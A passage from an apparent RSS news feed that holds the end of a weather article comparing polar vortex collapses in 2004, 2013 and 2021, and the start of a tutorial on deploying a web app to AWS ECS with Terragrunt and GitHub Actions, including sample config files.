<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-january-2004-ssw-event.png-nggid0521683-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="polar-vortex-splitting-weather-winter-united-states-europe-january-2004-ssw-event" title="polar-vortex-splitting-weather-winter-united-states-europe-january-2004-ssw-event" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-january-2004-ssw-event.png-nggid0521683-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-january-2013-ssw-event.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-january-2013-ssw-event.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_polar-vortex-splitting-weather-winter-united-states-europe-january-2013-ssw-event.png" data-image-id="21681" data-title="polar-vortex-splitting-weather-winter-united-states-europe-january-2013-ssw-event" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-january-2013-ssw-event.png-nggid0521681-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="polar-vortex-splitting-weather-winter-united-states-europe-january-2013-ssw-event" title="polar-vortex-splitting-weather-winter-united-states-europe-january-2013-ssw-event" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-january-2013-ssw-event.png-nggid0521681-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>We can see the progression of warming from the top of the stratosphere, going downwards over time. The first image shows the 2004 stratospheric warming event and the second graphic shows the 2013 event.</p>
<p>The important takeaway is that the warming progresses quite fast down into the troposphere and can start to quickly affect our weather. But it usually stops around 100mb or 150mb level (12-15km). That is normal, due to the fact that we can see a lot of strong weather systems in our troposphere, which can in some cases deflect/reverse any incoming effects from the stratosphere.</p>
<p>Below we have similar two images, but with pressure anomalies instead of temperature. But here you can actually see the connecting points between high pressure coming downwards and the surface layer in the polar region. In both cases, the final effect was seen as individual connections to the bottom levels over time, interfering with the weather development. This indicates that the influence from the Polar Vortex collapse events is periodically interfering with the weather development on a sub-seasonal scale, kinda like waving or resonating.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-2004-atmospheric-pressure-evolution.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-2004-atmospheric-pressure-evolution.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_polar-vortex-splitting-weather-winter-united-states-europe-2004-atmospheric-pressure-evolution.png" data-image-id="21680" data-title="polar-vortex-splitting-weather-winter-united-states-europe-2004-atmospheric-pressure-evolution" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-2004-atmospheric-pressure-evolution.png-nggid0521680-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="polar-vortex-splitting-weather-winter-united-states-europe-2004-atmospheric-pressure-evolution" title="polar-vortex-splitting-weather-winter-united-states-europe-2004-atmospheric-pressure-evolution" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-2004-atmospheric-pressure-evolution.png-nggid0521680-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-2013-atmospheric-pressure-evolution.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-2013-atmospheric-pressure-evolution.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_polar-vortex-splitting-weather-winter-united-states-europe-2013-atmospheric-pressure-evolution.png" data-image-id="21682" data-title="polar-vortex-splitting-weather-winter-united-states-europe-2013-atmospheric-pressure-evolution" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-2013-atmospheric-pressure-evolution.png-nggid0521682-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="polar-vortex-splitting-weather-winter-united-states-europe-2013-atmospheric-pressure-evolution" title="polar-vortex-splitting-weather-winter-united-states-europe-2013-atmospheric-pressure-evolution" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-2013-atmospheric-pressure-evolution.png-nggid0521682-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>We don’t yet have the same graphic for 2021, for obvious reasons, since we still need more data to be gathered. But we can look at the forecast data in a similar image below.</p>
<p>What we are seeing is a very similar pattern as in 2004 and 2013. The negative values in this image represent higher pressure. So we can see the descending high-pressure, making individual contacts with the lower layers. This means that the influence is not a constant every time, but rather periodic.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-pressure-anomaly-over-time.PNG" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-pressure-anomaly-over-time.PNG" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_polar-vortex-splitting-weather-winter-united-states-europe-pressure-anomaly-over-time.PNG" data-image-id="21689" data-title="polar-vortex-splitting-weather-winter-united-states-europe-pressure-anomaly-over-time" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-pressure-anomaly-over-time.PNG-nggid0521689-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.PNG" alt="polar-vortex-splitting-weather-winter-united-states-europe-pressure-anomaly-over-time" title="polar-vortex-splitting-weather-winter-united-states-europe-pressure-anomaly-over-time" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-pressure-anomaly-over-time.PNG-nggid0521689-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.PNG">
</a>
</p>
<p>We also decided to look at the weather patterns prior to the 2004 and 2013 events. And we can see in the images below. We can see on the first image for 2004, that the pattern was already positioned for colder weather over Europe, thanks to the strong high-pressure system in the North Atlantic. The United States was generally milder, with southerly flow dominating much of the CONUS.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-weather-winter-united-states-europe-pressure-pattern-before-2004-ssw-event.gif" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-weather-winter-united-states-europe-pressure-pattern-before-2004-ssw-event.gif" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_polar-vortex-weather-winter-united-states-europe-pressure-pattern-before-2004-ssw-event.gif" data-image-id="21688" data-title="polar-vortex-weather-winter-united-states-europe-pressure-pattern-before-2004-ssw-event" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-weather-winter-united-states-europe-pressure-pattern-before-2004-ssw-event.gif-nggid0521688-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.gif" alt="polar-vortex-weather-winter-united-states-europe-pressure-pattern-before-2004-ssw-event" title="polar-vortex-weather-winter-united-states-europe-pressure-pattern-before-2004-ssw-event" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E">
</a>
</p>
<p>In 2013, the picture was kinda the opposite. The pattern over the United States was generally colder than in 2004, while Europe was mild to warm even at this point.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-weather-winter-united-states-europe-pressure-pattern-before-2013-ssw-event.gif" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-weather-winter-united-states-europe-pressure-pattern-before-2013-ssw-event.gif" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_polar-vortex-weather-winter-united-states-europe-pressure-pattern-before-2013-ssw-event.gif" data-image-id="21686" data-title="polar-vortex-weather-winter-united-states-europe-pressure-pattern-before-2013-ssw-event" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-weather-winter-united-states-europe-pressure-pattern-before-2013-ssw-event.gif-nggid0521686-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.gif" alt="polar-vortex-weather-winter-united-states-europe-pressure-pattern-before-2013-ssw-event" title="polar-vortex-weather-winter-united-states-europe-pressure-pattern-before-2013-ssw-event" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E">
</a>
</p>
<p>This winter, the pattern is kinda a combination of both. We have another cooler/colder episode over Europe like in 2004, thanks to the high-pressure systems in the North Atlantic. At the same time, we also heed a few decent cold episodes over the United States as well.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-weather-winter-united-states-europe-pressure-pattern-before-2021-ssw-event.gif" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-weather-winter-united-states-europe-pressure-pattern-before-2021-ssw-event.gif" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_polar-vortex-weather-winter-united-states-europe-pressure-pattern-before-2021-ssw-event.gif" data-image-id="21692" data-title="polar-vortex-weather-winter-united-states-europe-pressure-pattern-before-2021-ssw-event" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-weather-winter-united-states-europe-pressure-pattern-before-2021-ssw-event.gif-nggid0521692-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.gif" alt="polar-vortex-weather-winter-united-states-europe-pressure-pattern-before-2021-ssw-event" title="polar-vortex-weather-winter-united-states-europe-pressure-pattern-before-2021-ssw-event" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E">
</a>
</p>
<p>But after the Polar Vortex breakdown and the stratospheric warming event, the pressure patterns changed quite importantly in 2004 and also in 2013. The image below is the pressure pattern one month after the Polar Vortex collapse in 2004. The strong high pressure in the North Atlantic has been replaced by a strong deep low-pressure system, and the high-pressure has moved into the Arctic …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.severe-weather.eu/global-weather/polar-vortex-collapse-winter-weather-europe-united-states-2021-fa/">https://www.severe-weather.eu/global-weather/polar-vortex-collapse-winter-weather-europe-united-states-2021-fa/</a></em></p>]]>
            </description>
            <link>https://www.severe-weather.eu/global-weather/polar-vortex-collapse-winter-weather-europe-united-states-2021-fa/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25713704</guid>
            <pubDate>Sun, 10 Jan 2021 11:40:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CI/CD Workflow for AWS ECS via Terragrunt and GitHub Actions]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25713700">thread link</a>) | @kiyanwang
<br/>
January 10, 2021 | https://camillovisini.com/article/terragrunt-github-actions-aws-ecs/ | <a href="https://web.archive.org/web/*/https://camillovisini.com/article/terragrunt-github-actions-aws-ecs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-3d5c50e8=""><p data-v-3d5c50e8="">This project leverages <a href="https://github.com/gruntwork-io/terragrunt" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">Terragrunt</a>, <a href="https://www.terraform.io/" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">Terraform</a>, and <a href="https://github.com/features/actions" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">GitHub Actions</a> to deploy a basic web app (dockerized JS frontend and dockerized Python API) to <a href="https://aws.amazon.com/ecs/" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">AWS ECS</a>.</p>

<h2 id="initial-setup" data-v-3d5c50e8="">Initial Setup</h2>
<p data-v-3d5c50e8=""><a href="https://github.com/gruntwork-io/terragrunt" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">Terragrunt</a> is a thin wrapper for Terraform that provides extra tools for working with multiple Terraform modules, remote state, and locking. It also provides a powerful and flexible way to hierarchically provide configuration to Terraform, without duplicating code across environments, AWS regions, and AWS accounts – <a href="https://blog.gruntwork.io/terragrunt-how-to-keep-your-terraform-code-dry-and-maintainable-f61ae06959d8?gi=703957a5f669" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">keeping your Terraform config DRY</a>.</p>
<div data-v-220acfa8="" data-v-3d5c50e8=""><p><img src="https://d33wubrfki0l68.cloudfront.net/d33f961cd6f8b89afbde2972798eb3c42f1eb5db/e349a/_nuxt/img/structure.b39ebef.jpg" width="100%" height="" alt="Managing Terraform config across accounts, regions, and environments with Terragrunt" data-v-220acfa8=""></p><p data-v-220acfa8="">Managing Terraform config across accounts, regions, and environments with Terragrunt</p></div>
<p data-v-3d5c50e8="">The following hierarchy is proposed (aligned with directory structure):</p>
<ul data-v-3d5c50e8="">
<li data-v-3d5c50e8=""><code data-v-3d5c50e8="">terragrunt.hcl</code> with configuration for remote_state and AWS provider</li>
<li data-v-3d5c50e8=""><code data-v-3d5c50e8="">common.terragrunt.hcl</code> defining common, project-specific variables
<ul data-v-3d5c50e8="">
<li data-v-3d5c50e8=""><code data-v-3d5c50e8="">account.terragrunt.hcl</code> for each account
<ul data-v-3d5c50e8="">
<li data-v-3d5c50e8=""><code data-v-3d5c50e8="">region.terragrunt.hcl</code> for each region within an account
<ul data-v-3d5c50e8="">
<li data-v-3d5c50e8=""><code data-v-3d5c50e8="">environment.terragrunt.hcl</code> for each environment within a region</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p data-v-3d5c50e8="">This allows flexible configuration, just add additional folders and adjust the configuration files, for instance configuring...</p>
<ul data-v-3d5c50e8="">
<li data-v-3d5c50e8="">Accounts <code data-v-3d5c50e8="">main</code> and <code data-v-3d5c50e8="">secondary</code></li>
<li data-v-3d5c50e8="">Regions <code data-v-3d5c50e8="">eu-west-1</code> and <code data-v-3d5c50e8="">us-east-1</code> in <code data-v-3d5c50e8="">main</code> vs. <code data-v-3d5c50e8="">us-east-1</code> in <code data-v-3d5c50e8="">secondary</code></li>
<li data-v-3d5c50e8="">Environments <code data-v-3d5c50e8="">prod</code> in <code data-v-3d5c50e8="">main</code> regions vs. <code data-v-3d5c50e8="">stage</code> and <code data-v-3d5c50e8="">dev</code> in <code data-v-3d5c50e8="">secondary</code> regions</li>
</ul>
<h2 id="workflow-via-github-flow" data-v-3d5c50e8="">Workflow via GitHub Flow</h2>
<p data-v-3d5c50e8="">This project leverages <a href="https://guides.github.com/introduction/flow/" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">GitHub Flow</a> for gradually merging changes existing on experimental branches and deployed to experimental environments, towards more mature branches and environments.</p>
<div data-v-220acfa8="" data-v-3d5c50e8=""><p><img src="https://d33wubrfki0l68.cloudfront.net/33cb4fb2f8dc6f32e90c06e48e4086caaf8eec8e/6b65e/_nuxt/img/branches.4c960fb.jpg" width="100%" height="" alt="Workflow and Deployment – GitHub Flow" data-v-220acfa8=""></p><p data-v-220acfa8="">Workflow and Deployment – GitHub Flow</p></div>
<p data-v-3d5c50e8="">The <a href="https://github.com/visini/terragrunt-github-actions-aws-ecs" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">companion repository</a> contains functionality to deploy code to AWS ECS simply by adopting GitHub Flow principles. All integration and deployment steps are managed by GitHub Actions workflows, including: Unit testing, building and pushing Docker images, and releasing new images to the correct ECS cluster via Terraform and Terragrunt. Create a branch, push, create a pull-request, and, after verifying checks, merge all changes - these are the only steps needed to deploy new features by adopting this approach.</p>
<p data-v-3d5c50e8="">Assuming a running staging and production environment, here's how to deploy changes made for a recent feature "foo" to staging and production environments:</p>
<p data-v-3d5c50e8=""><strong data-v-3d5c50e8="">Step 1</strong> → Deployment to staging environment <code data-v-3d5c50e8="">stage</code> via branch <code data-v-3d5c50e8="">dev</code></p>
<ul data-v-3d5c50e8="">
<li data-v-3d5c50e8="">Create a new branch <code data-v-3d5c50e8="">feature/foo</code> and check it out
<ul data-v-3d5c50e8="">
<li data-v-3d5c50e8=""><code data-v-3d5c50e8="">git checkout -b feature/foo</code></li>
</ul>
</li>
<li data-v-3d5c50e8="">Push to remote and set up to track remote branch <code data-v-3d5c50e8="">feature/foo</code> from <code data-v-3d5c50e8="">origin</code>
<ul data-v-3d5c50e8="">
<li data-v-3d5c50e8=""><code data-v-3d5c50e8="">git push --set-upstream origin feature/foo</code></li>
</ul>
</li>
<li data-v-3d5c50e8="">Open pull request from branch <code data-v-3d5c50e8="">feature/foo</code> to branch <code data-v-3d5c50e8="">dev</code> to plan deployment to <code data-v-3d5c50e8="">stage</code> environment</li>
<li data-v-3d5c50e8="">Wait for checks to complete: Workflow <code data-v-3d5c50e8="">terragrunt</code> will post terraform <code data-v-3d5c50e8="">plan</code> as a comment to pull request</li>
<li data-v-3d5c50e8="">Additional checks may include unit tests: See <code data-v-3d5c50e8="">pytest-api.yml</code></li>
<li data-v-3d5c50e8="">After verifying terraform <code data-v-3d5c50e8="">plan</code>, merge pull request into branch <code data-v-3d5c50e8="">dev</code></li>
<li data-v-3d5c50e8="">Workflow <code data-v-3d5c50e8="">terragrunt</code> will run again and <code data-v-3d5c50e8="">apply</code> deployment for <code data-v-3d5c50e8="">stage</code> environment</li>
<li data-v-3d5c50e8="">Code (and infrastructure) changes to branch <code data-v-3d5c50e8="">feature/foo</code> are now released to <code data-v-3d5c50e8="">stage</code> environment</li>
</ul>
<p data-v-3d5c50e8=""><strong data-v-3d5c50e8="">Step 2</strong> → Deployment to production environment <code data-v-3d5c50e8="">prod</code> via branch <code data-v-3d5c50e8="">main</code></p>
<ul data-v-3d5c50e8="">
<li data-v-3d5c50e8="">After verifying deployment to <code data-v-3d5c50e8="">stage</code> environment (e.g., e2e-testing), open pull request from branch <code data-v-3d5c50e8="">dev</code> to branch <code data-v-3d5c50e8="">main</code> to plan deployment to <code data-v-3d5c50e8="">prod</code> environment</li>
<li data-v-3d5c50e8="">Wait for checks to complete: Workflow <code data-v-3d5c50e8="">terragrunt</code> will post terraform <code data-v-3d5c50e8="">plan</code> as a comment to pull request</li>
<li data-v-3d5c50e8="">After verifying terraform <code data-v-3d5c50e8="">plan</code>, merge pull request into branch <code data-v-3d5c50e8="">main</code></li>
<li data-v-3d5c50e8="">Workflow <code data-v-3d5c50e8="">terragrunt</code> will run again and <code data-v-3d5c50e8="">apply</code> deployment for <code data-v-3d5c50e8="">prod</code> environment</li>
<li data-v-3d5c50e8="">Code (and infrastructure) changes to branch <code data-v-3d5c50e8="">dev</code> originating from branch <code data-v-3d5c50e8="">feature/foo</code> are now released to <code data-v-3d5c50e8="">prod</code> environment</li>
</ul>
<h2 id="configure-infrastructure-and-deployment-targets" data-v-3d5c50e8="">Configure Infrastructure and Deployment Targets</h2>
<p data-v-3d5c50e8="">The hierarchical configuration via Terragrunt is enabled by a main configuration file in which all other more granular configuration files are imported. In <code data-v-3d5c50e8="">terragrunt.hcl</code>, both remote state and AWS provider are defined according to values in more specific configuration files.</p>
<p data-v-3d5c50e8="">Both remote state and provider are dynamically defined for each deployment target (e.g., <code data-v-3d5c50e8="">prod</code> vs. <code data-v-3d5c50e8="">stage</code> environment) and AWS account ID (e.g., <code data-v-3d5c50e8="">main</code> vs. <code data-v-3d5c50e8="">secondary</code> account). This means, <code data-v-3d5c50e8="">prod</code> and <code data-v-3d5c50e8="">stage</code> environments (which may even be residing on two separate AWS accounts) adopt separate remote state backend configurations, depending on which environment subfolder <code data-v-3d5c50e8="">terragrunt</code> commands are executed from. Review this file and the nested Terragrunt configuration files in the <a href="https://github.com/visini/terragrunt-github-actions-aws-ecs" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">companion repository</a> for the detailed implementation.</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">locals</span><span data-v-3d5c50e8=""> {</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    common </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> read_terragrunt_config(find_in_parent_folders(</span><span data-v-3d5c50e8="">"common.terragrunt.hcl"</span><span data-v-3d5c50e8="">))</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">    account </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> read_terragrunt_config(find_in_parent_folders(</span><span data-v-3d5c50e8="">"account.terragrunt.hcl"</span><span data-v-3d5c50e8="">))</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">    region </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> read_terragrunt_config(find_in_parent_folders(</span><span data-v-3d5c50e8="">"region.terragrunt.hcl"</span><span data-v-3d5c50e8="">))</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">    environment </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> read_terragrunt_config(find_in_parent_folders(</span><span data-v-3d5c50e8="">"environment.terragrunt.hcl"</span><span data-v-3d5c50e8="">))</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">}</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">remote_state</span><span data-v-3d5c50e8=""> {</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">    backend </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">"s3"</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">9</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8=""># remote_state dynamically configured based on:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">10</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8=""># local.region.locals.aws_region</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">11</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8=""># local.account.locals.aws_account_id</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">12</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8=""># local.common.locals.app_name</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">13</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8=""># ...</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">14</span><span data-v-3d5c50e8="">}</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">15</span><span data-v-3d5c50e8="">generate</span><span data-v-3d5c50e8=""> "provider"</span><span data-v-3d5c50e8=""> {</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">16</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8=""># AWS provider dynamically configured based on:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">17</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8=""># local.region.locals.aws_region</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">18</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8=""># local.account.locals.aws_account_id</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">19</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8=""># ...</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">20</span><span data-v-3d5c50e8="">}</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">21</span><span data-v-3d5c50e8=""># The following variables apply to all configurations in this subfolder</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">22</span><span data-v-3d5c50e8=""># and are automatically merged into the child `terragrunt.hcl` config</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">23</span><span data-v-3d5c50e8=""># via the include block.</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">24</span><span data-v-3d5c50e8="">inputs </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> merge(</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">25</span><span data-v-3d5c50e8="">    local.common.locals,</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">26</span><span data-v-3d5c50e8="">    local.account.locals,</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">27</span><span data-v-3d5c50e8="">    local.region.locals,</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">28</span><span data-v-3d5c50e8="">    local.environment.locals</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">29</span><span data-v-3d5c50e8="">)</span></span></code></pre></div>
<p data-v-3d5c50e8="">Common variables, such as the app name, base domain name and hosted zone name, which apply to the project are configured in a separate file:</p>
<div data-v-3d5c50e8=""><div data-v-594b4fde="" data-v-3d5c50e8=""><pre data-v-594b4fde=""><span data-v-594b4fde=""><span data-v-594b4fde="">⬤</span> <span data-v-594b4fde="">⬤</span> <span data-v-594b4fde="">⬤</span><span data-v-594b4fde=""><span data-v-594b4fde="">tf ›</span></span><span data-v-594b4fde="">common.terragrunt.hcl</span></span></pre></div><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8=""># The following define common variables for the project.</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8=""># They are automatically pulled in in the root terragrunt.hcl</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8=""># configuration to feed forward to the child modules.</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">locals</span><span data-v-3d5c50e8=""> {</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">    app_name </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">"example-app"</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">    app_domain_name </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">"app.example.com"</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">    route53_hosted_zone_name </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">"example.com"</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">    use_existing_route53_hosted_zone </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">true</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">9</span><span data-v-3d5c50e8="">    github_sha </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">"will_be_automatically_set_by_github_actions_or_manual_script"</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">10</span><span data-v-3d5c50e8="">}</span></span></code></pre></div>
<p data-v-3d5c50e8="">One or any number of AWS accounts may be configured, each related to any number of regions and environments to be deployed via this AWS account:</p>
